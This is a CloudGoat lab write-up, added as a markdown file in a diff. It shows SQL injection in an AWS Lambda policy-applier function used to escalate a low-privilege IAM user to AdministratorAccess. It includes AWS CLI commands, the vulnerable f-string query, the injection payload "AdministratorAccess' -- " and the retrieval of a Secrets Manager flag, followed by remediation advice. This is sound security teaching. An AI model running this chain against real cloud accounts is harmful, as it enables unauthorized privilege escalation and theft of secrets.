@@ -1,0 +1,170 @@
+# Vulnerable Lambda — SQL Injection to Privilege Escalation
+
+**CloudGoat scenario:** `vulnerable_lambda`
+**Vulnerability class:** SQL injection → IAM privilege escalation
+**Difficulty:** Medium
+
+## Summary
+
+A Lambda function was designed to attach IAM policies to a user, but only if a small internal SQLite database confirmed the requested policy was "public" (self-service approved). The function built its database query by directly inserting user-supplied input into a SQL string, with no sanitization. This allowed a classic SQL injection: crafting an input that bypassed the "is this policy approved?" check entirely, tricking the function into attaching `AdministratorAccess` to a low-privilege user.
+
+## Attack chain
+
+Start (bilbo's limited credentials)
+│
+▼
+List IAM roles → find cg-lambda-invoker (bilbo is allowed to assume it)
+│
+▼
+Assume the cg-lambda-invoker role (temporary elevated-but-still-limited credentials)
+│
+▼
+List Lambda functions as the assumed role → find policy_applier_lambda1
+│
+▼
+Download and read the function's source code
+│   → finds unsanitized SQL query built from user input
+▼
+Craft a SQL injection payload: "AdministratorAccess' -- "
+│
+▼
+Invoke the Lambda with the payload → bypasses the approval check
+│
+▼
+bilbo now has AdministratorAccess attached
+│
+▼
+Use admin access to read the final secret from Secrets Manager
+
+## Screenshots
+
+![Vulnerable code](./screenshots/lambda_1_vuln_code.png)
+*The Lambda's source code — user input is pasted directly into a SQL query with no sanitization.*
+
+![Injection payload](./screenshots/lambda_2_payload.png)
+*The crafted payload — closes the string early and comments out the approval check.*
+
+![Successful invoke](./screenshots/lambda_3_invoke_success.png)
+*Invoking the Lambda with the payload — it reports success instead of rejecting the policy.*
+
+![Escalated permissions](./screenshots/lambda_4_escalated.png)
+*Confirming bilbo now has `AdministratorAccess` attached.*
+
+![Final flag](./screenshots/lambda_5_final_flag.png)
+*Retrieving the final secret from AWS Secrets Manager using the escalated access.*
+
+## Step-by-step
+
+### 1. Check bilbo's starting permissions
+
+```bash
+aws sts get-caller-identity --profile bilbo
+aws iam list-user-policies --user-name cg-bilbo-cgid3mksx7xpmy --profile bilbo
+aws iam get-user-policy --user-name cg-bilbo-cgid3mksx7xpmy --policy-name cg-bilbo-cgid3mksx7xpmy-standard-user-assumer --profile bilbo
+```
+
+bilbo's only meaningful permissions: `sts:AssumeRole` on `cg-lambda-invoker*`, plus IAM read-only.
+
+### 2. Assume the privileged role
+
+```bash
+aws iam list-roles --profile bilbo | grep cg-
+aws sts assume-role --role-arn arn:aws:iam::276833795973:role/cg-lambda-invoker-cgid3mksx7xpmy \
+  --role-session-name bilbo-session --profile bilbo
+```
+
+The returned temporary `AccessKeyId`, `SecretAccessKey`, and `SessionToken` were configured as a separate `lambda-invoker` CLI profile (session credentials expire — typically about an hour — so they need refreshing with a new `assume-role` call if a step takes too long).
+
+### 3. Find the target Lambda function
+
+```bash
+aws lambda list-functions --profile lambda-invoker
+```
+
+Found `cgid3mksx7xpmy-policy_applier_lambda1` — description: *"applies a managed policy to the user of your choice, so long as the database says that it's okay."*
+
+### 4. Download and read the function's source code
+
+```bash
+aws lambda get-function --function-name cgid3mksx7xpmy-policy_applier_lambda1 --profile lambda-invoker
+curl -o lambda_function.zip "<pre-signed S3 URL from the command above>"
+unzip lambda_function.zip -d lambda_code
+cat lambda_code/main.py
+```
+
+The vulnerable line:
+
+```python
+statement = f"select policy_name from policies where policy_name='{policy}' and public='True'"
+```
+
+User input (`policy`) is inserted directly into the SQL string with an f-string — no parameterization, no escaping. Classic SQL injection.
+
+### 5. Craft the injection payload
+
+```json
+{
+    "policy_names": ["AdministratorAccess' -- "],
+    "user_name": "cg-bilbo-cgid3mksx7xpmy"
+}
+```
+
+The `'` closes the string early; `--` comments out the rest of the query (including the `public='True'` check), so the query effectively becomes `... where policy_name='AdministratorAccess'` with no approval check at all.
+
+### 6. Invoke the Lambda with the payload
+
+```bash
+aws lambda invoke --function-name cgid3mksx7xpmy-policy_applier_lambda1 \
+  --cli-binary-format raw-in-base64-out \
+  --payload file://./payload.json out.txt --profile lambda-invoker
+
+cat out.txt
+# → "All managed policies were applied as expected."
+```
+
+### 7. Verify escalation
+
+```bash
+aws iam list-attached-user-policies --user-name cg-bilbo-cgid3mksx7xpmy --profile bilbo
+# → AdministratorAccess now attached
+
+aws s3 ls --profile bilbo
+# → succeeds, previously would have been denied
+```
+
+### 8. Retrieve the final flag
+
+```bash
+aws secretsmanager list-secrets --profile bilbo
+aws secretsmanager get-secret-value --secret-id cgid3mksx7xpmy-final_flag --profile bilbo
+```
+
+Secret retrieved (`cg-secret-846237-284529`), confirming full compromise from a low-privilege starting point to reading sensitive data.
+
+### 9. Clean up
+
+```bash
+cloudgoat destroy vulnerable_lambda
+```
+
+Verified with:
+```bash
+aws iam get-user --user-name cg-bilbo-cgid3mksx7xpmy --profile cloudgoat   # NoSuchEntity
+```
+
+## Root cause
+
+- The Lambda function built a SQL query using unsanitized, directly-interpolated user input.
+- No input validation, allow-listing, or parameterized queries were used before the value reached the database.
+- A low-privilege user was allowed to assume a role that could invoke this function directly, giving a realistic path from limited access to the vulnerable code.
+
+## Remediation
+
+1. **Use parameterized queries everywhere**, never string-interpolate user input into SQL. In Python with `sqlite_utils` or plain `sqlite3`, this means using `?` placeholders and passing values separately, e.g. `db.execute("select ... where policy_name = ?", [policy])`.
+2. **Validate input against an allow-list** before it ever reaches a database query — in this case, checking the requested policy name against a small, fixed list of approved policies in code, not just in a queryable database.
+3. **Apply least privilege to the Lambda's own execution role** — even if the injection is fixed, the function's IAM role should not have permission to attach high-privilege policies like `AdministratorAccess` under any circumstance.
+4. **Restrict which roles a given IAM user can assume** and audit `sts:AssumeRole` grants regularly — bilbo's ability to assume `cg-lambda-invoker` was the entry point into this whole chain.
+
+## Tools used
+
+Kali Linux, AWS CLI, CloudGoat, Terraform (via CloudGoat), manual source code review
